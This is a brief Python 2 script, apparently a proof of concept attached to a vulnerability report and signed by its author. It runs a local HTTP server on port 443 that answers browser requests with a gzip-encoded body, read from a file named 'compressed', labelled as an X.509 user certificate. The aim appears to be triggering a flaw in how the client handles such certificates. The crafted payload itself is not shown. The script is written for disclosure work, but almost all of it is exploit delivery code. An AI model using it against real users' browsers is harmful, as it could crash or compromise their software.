#! /usr/bin/python2

import socket
import sys
import time

kHost = '127.0.0.1'
kPort = 443

def bind_listen():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
  s.bind((kHost, kPort))
  s.listen(1)
  return s

def send_certificate(c, r):
  print '[*] sending certificate'
  payload = ''
  with open('compressed', 'rb') as tmp:
    payload = tmp.read()
  c.send('HTTP/1.1 200 OK\r\n')
  c.send('Content-Type: application/x-x509-user-cert\r\n')
  c.send('Content-Encoding: gzip\r\n')
  c.send('Content-Length: {}\r\n'.format(len(payload)))
  c.send('\r\n')
  c.send(payload)

def main():
  print '[*] listening for connection on port {}:{}'.format(kHost, kPort)
  s = bind_listen()
  while True:
    c, (host, port) = s.accept()
    print '[*] connection from {}:{}'.format(host, port)
    while True:
      r = c.recv(1024)
      if 'favicon' in r:
        c.send('HTTP/1.1 404 Not Found\r\n\r\n')
      else:
        send_certificate(c, r)
        time.sleep(20)
        sys.exit(0)

if __name__ == '__main__':
  main()

Thanks,
Paulos Yibelo